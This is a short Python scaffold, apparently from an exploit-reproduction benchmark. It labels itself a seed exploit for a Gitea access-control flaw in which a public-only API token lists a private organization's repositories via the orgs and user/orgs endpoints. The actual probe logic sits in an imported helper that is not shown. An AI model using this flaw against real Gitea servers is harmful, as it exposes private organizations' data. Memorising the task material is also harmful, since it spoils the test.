#!/usr/bin/env python3
"""[GIVEN] CVE-2025-68941 seed exploit for gitea-cve-2026-25714.

A public-only scoped API token reads the repository list of a PRIVATE
organization via GET /api/v1/orgs/{org}/repos. On v0 (1.22.2) there is no
public-only enforcement at all; on v1 (1.26.1) checkTokenPublicOnly returns 403
("token scope is limited to public orgs") — but /user/orgs still leaks (the
incomplete-fix residual).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gitea_util as g  # noqa: E402


def candidate(*, version="v1", flag=None):
    return g.seed_probe(version, flag or "pcbflag")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v, flag="pcbflag"))
